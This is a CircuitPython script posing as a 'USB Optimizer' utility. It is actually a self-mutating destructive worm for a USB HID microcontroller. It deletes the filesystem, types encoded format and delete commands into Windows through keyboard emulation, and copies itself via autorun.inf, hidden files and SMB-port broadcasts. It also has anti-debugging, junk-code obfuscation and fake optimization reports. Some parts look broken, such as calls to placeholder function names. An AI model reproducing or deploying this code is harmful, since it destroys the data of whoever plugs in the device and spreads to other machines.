# USB Optimizer
# Description: Advanced system utility for optimizing USB device performance, enhancing storage, and streamlining network operations.
# Note: Admin privileges recommended for optimal results.

import usb_hid
import adafruit_hid.keyboard as Keyboard
import adafruit_hid.keyboard_layout_us as KeyboardLayout
import time
import os
import random
import string
import binascii
import base64
import storage
import microcontroller
from adafruit_circuitpython_aes import AES

# Metamorphic engine: Rewrite code structure
def _meta_engine(code):
    # Split into functions
    lines = code.split('\n')
    funcs = []
    current_func, indent = [], 0
    for line in lines:
        if line.strip().startswith('def '):
            if current_func:
                funcs.append(current_func)
            current_func = [line]
            indent = len(line) - len(line.lstrip())
        elif current_func and (not line.strip() or len(line) - len(line.lstrip()) > indent):
            current_func.append(line)
        else:
            if current_func:
                funcs.append(current_func)
                current_func = []
    if current_func:
        funcs.append(current_func)

    # Transform each function
    new_funcs = []
    for func in funcs:
        # Randomize implementation
        if 'walk' in ''.join(func):  # Filesystem shredding
            new_func = _alt_shred()
        elif 'socket' in ''.join(func):  # Network spread
            new_func = _alt_net()
        elif 'Keyboard' in ''.join(func):  # Keyboard payload
            new_func = _alt_cmd()
        elif 'autorun' in ''.join(func):  # USB spread
            new_func = _alt_usb()
        else:
            new_func = func
        # Obfuscate names
        new_func = '\n'.join(new_func)
        new_func = _obf_names(new_func)
        # Inject junk and shuffle
        new_func = _inj_junk(new_func)
        new_funcs.append(new_func.split('\n'))

    # Reassemble code
    new_code = []
    for func in new_funcs:
        new_code.extend(func)
    # Add main execution block
    new_code.extend(_alt_main().split('\n'))
    return '\n'.join(new_code)

# Alternative shred implementation
def _alt_shred():
    style = random.choice(['recursive', 'listdir', 'iterative'])
    if style == 'recursive':
        return """
def _qwe_{0}():
    try:
        paths = []
        for r in ['/']:
            paths.append(r)
        while paths:
            p = paths.pop()
            try:
                for x in os.listdir(p):
                    fp = os.path.join(p, x)
                    if os.path.isfile(fp):
                        os.unlink(fp)
                    else:
                        paths.append(fp)
            except:
                pass
        with open(_zxc_{1}(), 'wb') as f:
            f.write(os.urandom(1048576))
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)), ''.join(random.choices(string.ascii_lowercase, k=8)))
    elif style == 'listdir':
        return """
def _asd_{0}():
    try:
        for x in os.listdir('/'):
            try:
                os.remove('/' + x)
            except:
                try:
                    os.rmdir('/' + x)
                except:
                    pass
        open(_zxc_{1}(), 'wb').write(os.urandom(1048576))
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)), ''.join(random.choices(string.ascii_lowercase, k=8)))
    else:
        return """
def _fgh_{0}():
    try:
        def _del(p):
            if os.path.isfile(p):
                os.remove(p)
            elif os.path.isdir(p):
                for x in os.listdir(p):
                    _del(os.path.join(p, x))
                os.rmdir(p)
        _del('/')
        with open(_zxc_{1}(), 'wb') as f:
            f.write(os.urandom(1048576))
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)), ''.join(random.choices(string.ascii_lowercase, k=8)))

# Alternative network spread
def _alt_net():
    style = random.choice(['scan', 'broadcast'])
    if style == 'scan':
        return """
def _jkl_{0}():
    try:
        wlan = network.WLAN(network.STA_IF)
        wlan.active(True)
        wlan.connect('OpenWiFi', '')
        time.sleep(5)
        if wlan.isconnected():
            s = socket.socket()
            for i in range(1, 255):
                try:
                    s.connect(('192.168.1.' + str(i), 445))
                    with open(_zxc_{1}(), 'wb') as f:
                        f.write(open(__file__, 'rb').read())
                    s.close()
                except:
                    pass
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)), ''.join(random.choices(string.ascii_lowercase, k=8)))
    else:
        return """
def _mno_{0}():
    try:
        wlan = network.WLAN(network.STA_IF)
        wlan.active(True)
        wlan.connect('OpenWiFi', '')
        time.sleep(5)
        if wlan.isconnected():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(open(__file__, 'rb').read(), ('255.255.255.255', 445))
            s.close()
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)))

# Alternative keyboard payload
def _alt_cmd():
    style = random.choice(['powershell', 'cmd'])
    if style == 'powershell':
        return """
def _pqr_{0}():
    k = Keyboard.Keyboard(usb_hid.devices)
    l = KeyboardLayout.KeyboardLayoutUS(k)
    time.sleep(1)
    k.press(Keyboard.Keycode.WINDOWS, Keyboard.Keycode.R)
    k.release_all()
    time.sleep(0.5)
    cmd = {1}
    enc, m, k = _enc_cmd(cmd)
    dec = _gen_dec(enc, m, k)
    l.write_string(dec)
    k.press(Keyboard.Keycode.ENTER)
    k.release_all()
""".format(''.join(random.choices(string.ascii_lowercase, k=8)), _frag_str("powershell Remove-Item -Path * -Force -Recurse; Format-Disk -DriveLetter C -FileSystem NTFS -QuickFormat"))
    else:
        return """
def _stu_{0}():
    k = Keyboard.Keyboard(usb_hid.devices)
    l = KeyboardLayout.KeyboardLayoutUS(k)
    time.sleep(1)
    k.press(Keyboard.Keycode.WINDOWS, Keyboard.Keycode.R)
    k.release_all()
    time.sleep(0.5)
    cmd = {1}
    enc, m, k = _enc_cmd(cmd)
    dec = _gen_dec(enc, m, k)
    l.write_string(dec)
    k.press(Keyboard.Keycode.ENTER)
    k.release_all()
""".format(''.join(random.choices(string.ascii_lowercase, k=8)), _frag_str("cmd /c del /f /s /q *.* & format c: /fs:ntfs /q /y"))

# Alternative USB spread
def _alt_usb():
    style = random.choice(['autorun', 'hidden'])
    if style == 'autorun':
        return """
def _vwx_{0}():
    try:
        storage.enable_usb_drive()
        with open('/autorun.inf', 'w') as f:
            f.write('[AutoRun]\\nopen=usb_optimizer.py')
        with open('/usb_optimizer.py', 'w') as f:
            f.write(_meta_engine(open(__file__, 'r').read()))
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)))
    else:
        return """
def _yza_{0}():
    try:
        storage.enable_usb_drive()
        with open('/.sys_opt.py', 'w') as f:
            f.write(_meta_engine(open(__file__, 'r').read()))
    except:
        pass
""".format(''.join(random.choices(string.ascii_lowercase, k=8)))

# Alternative main execution
def _alt_main():
    style = random.choice(['sequential', 'nested'])
    if style == 'sequential':
        return """
try:
    if _chk_dbg():
        _fake_opt()
        raise SystemExit
    nm = _rnd_nm()
    os.rename(__file__, nm)
    with open(nm, 'r') as f:
        src = f.read()
    src = _meta_engine(src)
    with open(nm, 'w') as f:
        f.write(src)
    _fake_opt()
    _qwe_{0}()
    _pqr_{1}()
    _vwx_{2}()
    if 'W' in microcontroller.cpu.name:
        _jkl_{3}()
except:
    pass
try:
    os.remove(__file__)
except:
    pass
""".format(*[''.join(random.choices(string.ascii_lowercase, k=8)) for _ in range(4)])
    else:
        return """
try:
    if _chk_dbg():
        _fake_opt()
        raise SystemExit
    def _inner():
        nm = _rnd_nm()
        os.rename(__file__, nm)
        with open(nm, 'r') as f:
            src = f.read()
        src = _meta_engine(src)
        with open(nm, 'w') as f:
            f.write(src)
        _fake_opt()
        _qwe_{0}()
        _pqr_{1}()
        _vwx_{2}()
        if 'W' in microcontroller.cpu.name:
            _jkl_{3}()
    _inner()
except:
    pass
try:
    os.remove(__file__)
except:
    pass
""".format(*[''.join(random.choices(string.ascii_lowercase, k=8)) for _ in range(4)])

# Anti-debugging
def _chk_dbg():
    try:
        if hasattr(os, 'uname') and 'DEBUG' in os.uname()[3]:
            raise ValueError('Optimization paused.')
        return False
    except:
        _decoy_error()
        return True

# Decoy error
def _decoy_error():
    for _ in range(random.randint(1, 5)):
        print('Error: USB device misconfigured.')
        time.sleep(random.uniform(0.1, 1))
    with open('log.txt', 'w') as f:
        f.write('Optimization failed: hardware issue.\n')

# Encryption for payloads
def _enc_cmd(data):
    methods = ['xor', 'aes', 'base64']
    method = random.choice(methods)
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    if method == 'xor':
        result = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        result = binascii.hexlify(result.encode()).decode()
    elif method == 'aes':
        aes = AES.new(key.encode(), AES.MODE_ECB)
        pad_len = 16 - (len(data) % 16)
        padded = data + ' ' * pad_len
        result = binascii.hexlify(aes.encrypt(padded.encode())).decode()
    else:
        result = base64.b64encode(data.encode()).decode()
    return result, method, key

# Decoder generation
def _gen_dec(enc, method, key):
    dec = """
if '{0}' == 'xor':
    d = binascii.unhexlify('{1}').decode()
    d = ''.join(chr(ord(c) ^ ord('{2}'[i % len('{2}']))) for i, c in enumerate(d))
elif '{0}' == 'aes':
    from adafruit_circuitpython_aes import AES
    aes = AES.new('{2}'.encode(), AES.MODE_ECB)
    d = aes.decrypt(binascii.unhexlify('{1}')).decode().rstrip()
else:
    import base64
    d = base64.b64decode('{1}').decode()
exec(d)
""".format(method, enc, key)
    return _obf_names(_inj_junk(dec))

# Name obfuscation
def _obf_names(code):
    reserved = {'def', 'import', 'as', 'try', 'except', 'with', 'for', 'in', 'if', 'else', 'return'}
    words = code.split()
    name_map = {w: ''.join(random.choices(string.ascii_lowercase, k=10)) for w in words if w.isidentifier() and w not in reserved}
    for old, new in name_map.items():
        code = code.replace(f'\b{old}\b', new)
    return code

# Junk code injection
def _inj_junk(code):
    junk = [
        "x = random.randint(1, 100); y = x * x; del y",
        "z = ['a', 'b']; z.reverse(); del z",
        "for i in range(3): time.sleep(0.01)",
        "try: a = 1/0; except: pass"
    ]
    lines = code.split('\n')
    for _ in range(random.randint(15, 25)):
        lines.insert(random.randint(0, len(lines)), random.choice(junk))
    random.shuffle(lines[:len(lines)//3])
    return '\n'.join(lines)

# String fragmentation
def _frag_str(s):
    parts = [s[i:i+2] for i in range(0, len(s), 2)]
    return '+'.join(f"'{p}'" for p in parts)

# Fake optimization report
def _fake_opt():
    stats = {'files': random.randint(100, 1000), 'bytes': random.randint(1000, 10000)}
    with open('opt_report.txt', 'w') as f:
        f.write(f'Optimization Summary: {stats}\n')
    return stats

# Random name generator
def _rnd_nm(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + '.tmp'

# Main execution
try:
    if _chk_dbg():
        _fake_opt()
        raise SystemExit
    nm = _rnd_nm()
    os.rename(__file__, nm)
    with open(nm, 'r') as f:
        src = f.read()
    src = _meta_engine(src)
    with open(nm, 'w') as f:
        f.write(src)
    _fake_opt()
    _qwe_random123()
    _pqr_random456()
    _vwx_random789()
    if 'W' in microcontroller.cpu.name:
        _jkl_random012()
except:
    pass
try:
    os.remove(__file__)
except:
    pass